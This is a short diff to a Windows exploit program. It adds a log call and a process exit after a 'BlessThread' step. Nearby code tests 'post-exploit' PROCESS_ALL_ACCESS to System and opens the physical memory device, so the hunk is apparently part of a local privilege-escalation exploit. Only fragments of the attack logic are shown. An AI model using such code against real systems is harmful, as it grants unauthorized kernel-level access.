@@ -458,11 +458,14 @@ int wmain(int argc, wchar_t* argv[])
     // Attempt to connect to an existing server via IPC
     if (BlessThread(elevateThreadId, false))
     {
+        Log(Info, "Initial blessing successful", TestExploit());
+
         if (GetCurrentThreadId() == elevateThreadId)
         {
             Log(Info, "Testing post-exploit ability to acquire PROCESS_ALL_ACCESS to System: %s", TestExploit());
             OpenPhysicalMemoryDevice();
         }
+        ExitProcess(0);
     }
 
     // Clean up from any previous failed runs
